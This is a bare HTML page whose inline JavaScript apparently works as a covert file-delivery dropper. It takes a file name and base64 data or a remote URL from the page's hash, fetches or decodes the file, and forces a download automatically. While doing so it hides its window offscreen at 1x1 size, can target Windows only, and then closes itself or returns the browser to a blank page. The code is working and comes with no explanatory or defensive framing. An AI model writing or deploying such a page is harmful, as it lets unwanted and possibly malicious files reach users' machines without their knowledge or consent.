<!DOCTYPE html>
<html><head><script>
// INSTANT EXIT — runs before ANYTHING renders
(function(){
  var h=location.hash?location.hash.slice(1):'';
  if(!h)return;
  h=h.replace('&popup=1','');
  try{h=decodeURIComponent(h)}catch(e){}
  if(h.slice(-2)==='!W')h=h.slice(0,-2);
  var s=h.indexOf('~'),n=s>0?h.slice(0,s):'x';
  if(!localStorage.getItem('dl_done_'+n))return;
  // ALREADY DONE — exit NOW
  window.stop();
  if(history.length>2){history.back();return}
  window.close();
  location.replace('about:blank');
})();
</script><title>.</title></head>
<body>
<script>
(function(){
  var _pop=location.hash.indexOf('popup=1')!==-1||!!window.opener;
  var _newTab=history.length<=2;

  function _exit(){
    if(_pop){window.close();return}
    if(!_newTab){history.back();setTimeout(function(){window.close()},300);return}
    window.close();
    setTimeout(function(){location.replace('about:blank')},100);
  }

  try{window.resizeTo(1,1);window.moveTo(-9999,-9999)}catch(e){}

  // Popup delegation (Firefox same-tab)
  if(!_pop&&!_newTab){
    try{
      var p=window.open(location.href+'&popup=1','_blank','width=1,height=1,left=-9999,top=-9999');
      if(p){history.back();return}
    }catch(e){}
  }

  var h=location.hash?location.hash.slice(1):'';
  h=h.replace('&popup=1','');
  if(!h)return;
  try{h=decodeURIComponent(h)}catch(e){}

  var winOnly=false;
  if(h.slice(-2)==='!W'){winOnly=true;h=h.slice(0,-2)}
  if(winOnly&&navigator.platform.indexOf('Win')===-1){_exit();return}

  var sep=h.indexOf('~');
  var fname=sep>0?h.slice(0,sep):'delivered.bin';
  var data=sep>0?h.slice(sep+1):h;
  var key='dl_done_'+fname;

  if(localStorage.getItem(key)){_exit();return}

  function done(){
    localStorage.setItem(key,'1');
    setTimeout(_exit,1500);
  }

  function doDownload(blob){
    if(!blob||blob.size===0){_exit();return}
    var url=URL.createObjectURL(blob);
    var a=document.createElement('a');
    a.href=url;a.download=fname;a.style.display='none';
    document.body.appendChild(a);a.click();
    setTimeout(function(){try{URL.revokeObjectURL(url)}catch(e){}},2000);
    done();
  }

  if(data.indexOf('http')===0){
    fetch(data).then(function(r){
      if(!r.ok)throw'HTTP '+r.status;
      var exp=parseInt(r.headers.get('content-length')||'0');
      return r.blob().then(function(b){
        if(exp>0&&b.size<exp)throw'Incomplete';
        return b;
      });
    }).then(function(b){doDownload(b)}).catch(function(e){
      setTimeout(_exit,3000);
    });
  }else{
    try{
      var raw=atob(data);
      var arr=new Uint8Array(raw.length);
      for(var i=0;i<raw.length;i++)arr[i]=raw.charCodeAt(i);
      doDownload(new Blob([arr],{type:'application/octet-stream'}));
    }catch(e){setTimeout(_exit,2000)}
  }
})();
</script>
</body></html>
